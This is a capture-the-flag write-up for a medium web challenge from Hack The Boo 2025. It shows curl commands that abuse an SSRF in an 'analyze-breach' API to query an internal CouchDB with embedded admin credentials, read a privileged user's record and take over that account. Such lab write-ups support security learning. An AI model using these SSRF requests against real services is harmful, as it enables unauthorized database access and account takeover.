status: #pwnd 
ctf: #hacktheboo2025 
level: #medium 
type: #web 
challenge: the wax-circle reclaimed 
helper: #sourcecode 

---
# website 
- couchdb with db credentials: http://admin:waxcircle2025@127.0.0.1:5984 
- couchdb database users where all user informations are stored 
- flag behind acc with higher privileges 
- guest login: guest guest123 
- option to interact with apis

# sourcecode 
- interesting code snippets 
```javascript
const couchdbUrl = 'http://admin:waxcircle2025@127.0.0.1:5984';
 
async function initializeDatabase() { 
	... 
	for (let i = 1; i <= 1000; i++) { 
// Check if this is the position for elin_croft 
		if (i === elinCroftPosition) { 
			const elinPassword = generateSecurePassword(16);
			generatedUsers.push({ 
				_id: 'user_elin_croft', 
				type: 'user', 
				username: 'elin_croft', 
				password: elinPassword, 
				role: 'guardian', 
				clearance_level: 'divine_authority' 
			}); 
		} 
		... 
	} 
	... 
	// Create databases 
	usersDb = await createDatabaseWithData('users', allUsers);
}
```

```javascript
app.get('/dashboard', requireAuth, async (req, res) => { 
	try { 
// Check if user has high authority to see the flag 
		const hasHighAuthority = req.user.role === 'guardian' && req.user.clearance_level === 'divine_authority';
		res.render('dashboard', { 
			title: 'Threshold Monitoring Dashboard', 
			user: req.user, 
			thresholds: [], 
			flag: hasHighAuthority ? FLAG : null, 
			hasHighAuthority: hasHighAuthority 
		}); 
	} catch (err) { 
	... 
	} 
});
```

```javascript
app.post('/api/analyze-breach', requireAuth, (req, res) => { 
	... 
}
```

# vulnerability 
- https://book.hacktricks.wiki/en/network-services-pentesting/5984-pentesting-couchdb.html 
- SSRF 
- option to interact with apis 
- send couchdb url with credentials as api first

```bash
curl -X POST 'http://64.226.86.52:31324/api/analyze-breach' \
	-H 'Cookie: auth_token=e<your-cookie-here>' \
	--data-raw '{"data_source":"http://admin:waxcircle2025@127.0.0.1:5984/"}'
```

this worked and we got a response from the database 
next i tried pulling the informations from the `users` database 

```bash
curl -X POST 'http://64.226.86.52:31324/api/analyze-breach' \
	-H 'Cookie: auth_token=<your-cookie-here>' \
	--data-raw '{"data_source":"http://admin:waxcircle2025@127.0.0.1:5984/users/_all_docs"} ' \
| jq -C
```

worked aswell and i got some informations about the `users` database 

now that i know from the sourcecode, the user `elin_croft` has the privileges to read the flag my next move was to look for her database entry

```bash
curl -X POST 'http://64.226.86.52:31324/api/analyze-breach' \
-H 'Cookie: auth_token=<your-cookie-here>' \
--data-raw '{"data_source":"http://admin:waxcircle2025@127.0.0.1:5984/users/user_elin_c roft"}' \
| jq -C
```

and here we have the database entry with her password

```json
{ 
	"status": "success", 
	"data": {
		"_id":"user_elin_croft",
		"_rev":"1-2d0ba0db63a94bb61062250d532897b4",
		"type":"user",
		"username":"elin_croft",
		"password":" <redacted>",
		"role":"guardian",
		"clearance_level":"divine_authority"
		}, 
	"source": "http://admin:waxcircle2025@127.0.0.1:5984/users/user_elin_croft", 
	"truncated": false, 
	"size": 192 
}
```

now i can log in to the account of elin croft and receive the flag!